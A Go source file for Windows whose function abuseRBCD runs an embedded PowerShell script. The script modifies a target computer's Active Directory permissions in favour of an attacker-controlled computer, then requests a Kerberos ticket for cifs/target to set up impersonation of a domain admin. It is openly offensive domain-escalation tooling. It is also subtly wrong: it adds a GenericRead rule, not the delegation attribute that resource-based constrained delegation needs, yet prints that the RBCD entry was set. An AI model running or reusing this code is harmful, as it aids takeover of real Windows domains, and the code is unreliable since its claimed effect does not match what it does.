//go:build windows
// +build windows

package main

import (
	"fmt"
)

func abuseRBCD(targetComputer, attackerComputer, domainAdmin string) error {
	if targetComputer == "" || attackerComputer == "" || domainAdmin == "" {
		return fmt.Errorf("usage: abuseRBCD(targetComputer, attackerComputer, domainAdmin)")
	}

	psCmd := fmt.Sprintf(`
$target = "%s"
$attacker = "%s"
$adminUser = "%s"

try {
	$domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
	$targetDN = "CN=$target,CN=Computers,$domainDN"
	$attackerDN = "CN=$attacker,CN=Computers,$domainDN"

	$targetObj = [ADSI]"LDAP://$targetDN"
	$attackerObj = [ADSI]"LDAP://$attackerDN"

	$sid = New-Object System.Security.Principal.SecurityIdentifier $attackerObj.objectSid[0],0
	$sidBytes = New-Object byte[]($sid.BinaryLength)
	$sid.GetBinaryForm($sidBytes, 0)

	$ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
		$sid,
		[DirectoryServices.ActiveDirectoryRights]::GenericRead,
		[System.Security.AccessControl.AccessControlType]::Allow,
		[Guid]"00000000-0000-0000-0000-000000000000"
	)

	$acl = $targetObj.psbase.ObjectSecurity
	$acl.AddAccessRule($ace)
	$targetObj.psbase.CommitChanges()

	Write-Output "[+] RBCD ACE set on $target"
	Write-Output "[*] Attacker SID: $($sid.Value)"
	Write-Output "[*] Now use S4U2Self+S4U2Proxy to impersonate $adminUser"

	$tgs = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "cifs/$target"
	$tgsBytes = $tgs.GetRequest()
	Write-Output "[+] TGS obtained for cifs/$target ($($tgsBytes.Length) bytes)"
} catch {
	Write-Error "RBCD abuse failed: $_"
}
`, targetComputer, attackerComputer, domainAdmin)

	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return fmt.Errorf("RBCD abuse failed: %w\nOutput: %s", err, out)
	}
	_ = out
	return nil
}
